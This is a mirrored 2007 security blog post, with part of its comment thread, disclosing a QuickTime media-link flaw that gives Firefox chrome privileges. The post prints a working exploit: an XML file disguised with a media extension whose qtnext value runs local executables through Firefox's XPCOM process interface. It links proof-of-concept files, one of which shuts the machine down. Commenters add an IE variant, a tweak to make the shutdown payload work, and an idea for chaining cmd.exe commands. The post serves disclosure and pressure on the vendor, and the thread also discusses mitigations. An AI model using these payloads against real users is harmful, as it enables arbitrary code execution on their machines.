@@ -1,0 +1,1175 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/0day-quicktime-pwns-firefox/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:14:45 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; 0DAY: QuickTime pwns Firefox</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; 0DAY: QuickTime pwns Firefox Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Rain of -MINUS Transactions' href='../rain-of-minus-transactions/index.html' />
+<link rel='next' title='IE pwns SecondLife' href='../ie-pwns-secondlife/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index06d3.html?p=453' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-453" class="post">
+	<div class="post-title"><h2><span>0DAY: QuickTime pwns Firefox</span></h2></div>
+	<div class="post-date"><span>published:</span> September 12th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>It seams that QuickTime media formats can cause Firefox to misbehave. The result of this vulnerability can lead to full compromise of the browser.</p>
+
+<p>Before we move on, I have to say a few things. Last year I disclosed two QuickTime vulnerabilities <a href="../backdooring-quicktime-movies/index.html">here</a> and <a href="../backdooring-mp3-files/index.html">here</a>. The first vulnerability was fixed but the second one was completely ignored. I tried to bring the spot light on the second vulnerability one more time over <a href="../myspace-quicktime-worm-follow-up/index.html">here</a> without much of success. So, I decided to post a demonstration of how a <em>Low risk</em> issue can be turned into a very easy to perform <strong>HIGH risk</strong> attack when technology change.</p>
+
+<p>The exploit is rather simple. But first, here is a simple QTL file which instructs the browser to display a friendly <code>alert('whats up...')</code> message on the screen:</p>
+
+<pre><code>&lt;?xml version="1.0"&gt;
+&lt;?quicktime type="application/x-quicktime-media-link"?&gt;
+&lt;embed src="presentation.mov" autoplay="true" qtnext="javascript:alert('whats up...')"/&gt;</code></pre>
+
+<p>The most interesting thing about this simple XML file is that we can save it with QuickTime supported extension in order to mislead the user. If you check <a href="about:plugins">about:plugins</a> under Firefox,  you will see that QuickTime supports several media formats. We can use the audio and video formats only. This means that you can paste the above code into files with extensions: <code>3g2, 3gp, 3gp2, 3gpp, AMR, aac, adts, aif, aifc, aiff, amc, au, avi, bwf, caf, cdda, cel, flc, fli, gsm, m15, m1a, m1s, m1v, m2a, m4a, m4b, m4p, m4v, m75, mac, mov, mp2, mp3, mp4, mpa, mpeg, mpg, mpm, mpv, mqv, pct, pic, pict, png, pnt, pntg, qcp, qt, qti, qtif, rgb, rts, rtsp, sdp, sdv, sgi, snd, ulw, vfw, wav</code> and others.</p>
+
+<p>Enough theory, let&#8217;s see some action. For more information, just read <a href="../backdooring-mp3-files/index.html">this</a> blog post. The exploit that gains chrome privileges looks like this:</p>
+
+<pre><code>&lt;?xml version="1.0"&gt;
+&lt;?quicktime type="application/x-quicktime-media-link"?&gt;
+&lt;embed src="a.mp3" autoplay="true" qtnext="-chrome javascript:file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c:\\windows\\system32\\calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(true,[],0);void(0);"/&gt;</code></pre>
+
+<p>In practice I can do anything with the browser. However, just for the sake of this demonstration, I simply open <strong>calc.exe</strong>.</p>
+
+<p>If you dare to try this in your browser, here is a list of a few files you have to click on. They are not malicious. You have my word: <a href="../../static/blog/2007/09/qt-poc-01.mp3">qt-poc-01.mp3</a>, <a href="../../static/blog/2007/09/qt-poc-02-shutdown-dont-click.mp3">qt-poc-02-shutdown-dont-click.mp3</a>, <a href="../../static/blog/2007/09/qt-poc-03.mpeg">qt-poc-03.mpeg</a>, <a href="../../static/blog/2007/09/qt-poc-04.mov">qt-poc-04.mov</a>, <a href="../../static/blog/2007/09/qt-poc-05.avi">qt-poc-05.avi</a>.</p>
+
+<p><em>BTW, QuickTime comes by default with iTunes. Therefore, iTunes users are most affected, I believe.</em></p><div class="single-content-bottom-widgets"></div></div>
+	<ul class='post-meta'>
+<li><span class='post-meta-key'>Download:</span> <a href="../../static/blog/2007/09/qt-poc-01.mp3">qt-poc-01.mp3</a>, <a href="../../static/blog/2007/09/qt-poc-02-shutdown-dont-click.mp3">qt-poc-02-shutdown-dont-click.mp3</a>, <a href="../../static/blog/2007/09/qt-poc-03.mpeg">qt-poc-03.mpeg</a>, <a href="../../static/blog/2007/09/qt-poc-04.mov">qt-poc-04.mov</a>, <a href="../../static/blog/2007/09/qt-poc-05.avi">qt-poc-05.avi</a></li>
+</ul>
+	<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/firefox/index.html" rel="tag">firefox</a> | <a href="../../tags/quicktime/index.html" rel="tag">QuickTime</a> | <a href="../../tags/vulnerability/index.html" rel="tag">vulnerability</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-48313">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5d1658ac36692c8b5ff5612aa9d6a837?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">rezn</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48313">
+			September 12, 2007 at 1:57 pm</a>		</div>
+
+		<p>nice one, pdp.</p>
+<p>i am curious &#8211; did you ever formally submit this to apple security beyond posting on your blog?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48314">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3fca77349c84a4a4ce1a6bca89cb7707?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">tenest</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48314">
+			September 12, 2007 at 2:05 pm</a>		</div>
+
+		<p>wow&#8230;</p>
+<p>/me&#8217;s jaw drops</p>
+<p>i thought for sure that I would be safe since I have never installed quicktime and instead use quicktime alternative (<a href="http://www.codecguide.com/download_qt.htm" rel="nofollow">http://www.codecguide.com/download_qt.htm</a>), but alas, these exploits work even against quicktime alternative&#8230;.</p>
+<p>very nice find&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48328">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7f5964ed9f043821b46150632596ed9a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.thespanner.co.uk/' rel='external nofollow' class='url'>Gareth Heyes</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48328">
+			September 12, 2007 at 3:23 pm</a>		</div>
+
+		<p>My question is why did you wait so long?</p>
+<p>Apple are useless, the only way to get them to do anything is to make it public. They either don&#8217;t acknowledge vulnerabilities or deny there is even a problem. I suggest changing your wait time to about 1 month.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48332">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://ikwt.com/' rel='external nofollow' class='url'>pagvac</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48332">
+			September 12, 2007 at 3:30 pm</a>		</div>
+
+		<p>Nice one dude. Screw overflows, who needs them when you can do things like this with JS.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48353">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/375c0284a6efd8899f2bc69dbf99d6e3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Hubert</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48353">
+			September 12, 2007 at 4:42 pm</a>		</div>
+
+		<p>Doesn&#8217;t work with Quicktime 6.5 and Firefox 2.0.0.6.  The browser window just shows a broken QT icon. Is my QT too old?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48371">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2ce72219509a4a56d20520404f3c1473?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.milan.it/' rel='external nofollow' class='url'>Galeazzi</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48371">
+			September 12, 2007 at 5:59 pm</a>		</div>
+
+		<p>this is the stuff we like : )</p>
+<p>very good job pdp</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48375">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/722c3bb0d5b36746c6ddaa540cf722fe?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.pc-technical.co.uk/' rel='external nofollow' class='url'>Simon Zerafa</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48375">
+			September 12, 2007 at 6:12 pm</a>		</div>
+
+		<p>Hi,</p>
+<p>Well this is a very good Quicktime exploit however it works in IE7 as well as FF 2.0.0.6</p>
+<p>Why so hard on FF? It seems to be a issue with QT not any specific browser.</p>
+<p>Kind Regards</p>
+<p>Simon</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48397">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0e92af000cf02969a8106f5b49edc07e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">mik</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48397">
+			September 12, 2007 at 6:48 pm</a>		</div>
+
+		<p>Firefox 2.0.0.6 and 3.0 are vulnerable.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48409">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/54a7af533806935b4e98f4d5a05152b2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.secniche.org/' rel='external nofollow' class='url'>Aks aka oknock</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48409">
+			September 12, 2007 at 7:33 pm</a>		</div>
+
+		<p>Good shot pdp.  thats really good.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48410">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/aa1014ab1416a4d1dbe3300dc746623f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">mwood</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48410">
+			September 12, 2007 at 7:35 pm</a>		</div>
+
+		<p>POPS IE</p>
+<pre><code>http&#58;//-chrome%20javascript:file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c://windows//system32//calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(true,[],0);void(0);</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48416">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/556f4ac7e166daeedb1b8968e228480b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">blah</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48416">
+			September 12, 2007 at 8:10 pm</a>		</div>
+
+		<p>Javascript doesn&#8217;t work for me using mplayer plugin to handle quicktime. </p>
+<p>&#8212;</p>
+<p>QuickTime Plug-in 6.0 / 7</p>
+<p>    File name: mplayerplug-in-qt.so<br />
+    mplayerplug-in 3.31</p>
+<p>    Video Player Plug-in for QuickTime, RealPlayer and Windows Media Player streams using MPlayer<br />
+    JavaScript Enabled and Using GTK2 Widgets</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-48428">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48428">
+			September 12, 2007 at 9:46 pm</a>		</div>
+
+		<p>Simon, yes it is not Firefox specific. It works for IE as well, although the impact is less critical I must say. This is due to the tightened security policies IE implements for local zone scripts.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48431">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b1ae202137780b6bd20c9cbef9bb16c5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.digg.ee/' rel='external nofollow' class='url'>Tonu Samuel</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48431">
+			September 12, 2007 at 10:03 pm</a>		</div>
+
+		<p>I wonder if Googlebot accesses this &#8220;qt-poc-02-shutdown-dont-click.mp3&#8243; link does it also shuts google down or bot only? lol :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48449">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/94fda2e8a3794a888f4a9273aadd5d2e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://31d1.com/' rel='external nofollow' class='url'>31d1</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48449">
+			September 12, 2007 at 11:30 pm</a>		</div>
+
+		<p>Yeah, googlebot would definitely open that in quicktime while running Firefox.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48454">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0b6cabe7eed95ed6ba3d41f78afee0e2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jeff</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48454">
+			September 12, 2007 at 11:49 pm</a>		</div>
+
+		<p>Not one of these links actually worked on my XP machine, using Opera.  This is not a bug in Quicktime, its shitty browsers.  You can&#8217;t seriously suggest that a media play mechanism should decide which URLs are safe and which are not &#8211; that is 100% the problem of the browser.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48457">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://hackademix.net/' rel='external nofollow' class='url'>Giorgio Maone</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48457">
+			September 13, 2007 at 12:02 am</a>		</div>
+
+		<p>Gecko browsers + NoScript are immune, no matter if the attacker site is whitelisted or not.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48477">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Xinstict</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48477">
+			September 13, 2007 at 1:30 am</a>		</div>
+
+		<p>Great work! Little note, this to work Firefox must be default browser.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48481">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/48b864c97466dda7b85a5c3acaaa7543?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">teque</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48481">
+			September 13, 2007 at 1:50 am</a>		</div>
+
+		<p>Nice disco pdp,</p>
+<p>qt-poc-02-shutdown-dont-click.mp3 link didn&#8217;t work on my box until i added parameter -s to pass in 2nd to last js statement &#8230; <code>process.run(true,['-s'],1);void(0);</code></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48498">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d61167b4b825aa45bfb196aaa2fb8d84?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.proactiverisk.com/' rel='external nofollow' class='url'>jinxpuppy</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48498">
+			September 13, 2007 at 2:26 am</a>		</div>
+
+		<p>nice!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48520">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/39bde984d316d69c707adf8be6649806?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">JulesLt</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48520">
+			September 13, 2007 at 3:22 am</a>		</div>
+
+		<p>Tested on OS X. By default Quicktime opens the links in Safari, even if this page is opened in Firefox. You need to set default browser to FF also. Having done so, clicking on links presents a cross-site scripting warning from FF, that the script you are running may be trying to trick you. Accepting this gives a file not found from Mozilla &#8211; possibly they gave taken something down??</p>
+<p>I really wanted to see if the native protection against installed software would kick in, or be bypassed.</p>
+<p>That said, it doesn&#8217;t matter if OS X is protected, given that most Quicktime installs are on Windows XP boxes running iTunes.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48531">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Xinstict</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48531">
+			September 13, 2007 at 3:39 am</a>		</div>
+
+		<p>Is it possible to run &#8220;directly&#8221; like <code>file.initWithPath('c:\\windows\\system32\\cmd.exe /c echo x &amp; run notepad.exe  &amp; etc')</code>? I&#8217;m not sure if it can be done but would be much easier to execute code without writing &#8216;firefox backdoors&#8217; in &#8216;chrome zone&#8217;&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48565">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/22fc1c7723fac43404decfa835c7797d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">bugstomper</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48565">
+			September 13, 2007 at 4:33 am</a>		</div>
+
+		<p>Firefox 2.0.0.6 under MacOS 10.4.10, the links result in an alert saying You are attempting to login to site mozilla.org with username chrome%20javascript but the site does not require authentication. Ths may be an attempt to trick you.  Is that the site you really want to visit? (I&#8217;m paraphrasing the alert warning from memory)</p>
+<p>Even if I do click Yes on that alert then Firefox tries to open a URL on <a href="http://mozilla.org/" rel="nofollow">http://mozilla.org</a>, not a local file or chrome type URL or whatever you are trying to do as an exploit, and all that results is a 404 file not found.</p>
+<p>So it appears that Firefox on the Mac is not vulnerable to this after all.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48577">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/9e76e2f4d28c9b303eacdaf670e5b6a9?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">dbacon</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48577">
+			September 13, 2007 at 4:52 am</a>		</div>
+
+		<p>It doesn&#8217;t work if you have Quicktime alternative installed.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48610">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3953332dce3c112a76e7287d55dce3ab?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://g00ns.net/' rel='external nofollow' class='url'>clorox</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48610">
+			September 13, 2007 at 5:46 am</a>		</div>
+
+		<p>nice pdp</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48700">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/9b535e633d32e23e2dd327dbeb7b6fe7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Hawkuletz</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48700">
+			September 13, 2007 at 7:37 am</a>		</div>
+
+		<p>Doesn&#8217;t work on my Mac (Mac OS 10.4.10, Firefox 2.0.0.6 and Quicktime 7.2)</p>
+<p>So crossplatform exploits are not yet feasible.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48718">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5843f6624044d5717ee07d5e87e5516b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">chris</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48718">
+			September 13, 2007 at 8:32 am</a>		</div>
+
+		<p>I created a file with you POC code in it, named it test.html and opened it in Windows and it didn&#8217;t do anything.  I put in a real mp3 file named a.mp3 and all it did was play the song yet when I click on your links it works fine.  Am I missing something?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48733">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/089c7154da2ebc6562f35c8a8e48c4eb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Crolwey</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48733">
+			September 13, 2007 at 9:49 am</a>		</div>
+
+		<p>The exploits does not work if you have installed the NoScript extension, even if you allow JavaScript for gnucitizen.org.</p>
+<p>The exploits do work, of course, if you allow all sites to use JavaScript, i.e. deactivate NoScript.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48792">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bk</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48792">
+			September 13, 2007 at 3:16 pm</a>		</div>
+
+		<p>interestingly, when you try these exploits in Firefox on a Macbook Pro, it launches Safari, and pops up Mozilla.org 404 page.</p>
+<p>the exploits did not work for me on a XP2 system, even after disabling noscript. but I am using a limited user account, so maybe that makes a diff?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48794">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bk</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48794">
+			September 13, 2007 at 3:19 pm</a>		</div>
+
+		<p>i also tried the exploit in an Windows XP SP2 system  using IE7, and it did not work. but again, I was testing using a limited user account, though I don&#8217;t know if that makes any difference</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48800">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2a8e46aa4f72a53fbf095557d5eeb4f1?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">dave</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48800">
+			September 13, 2007 at 3:30 pm</a>		</div>
+
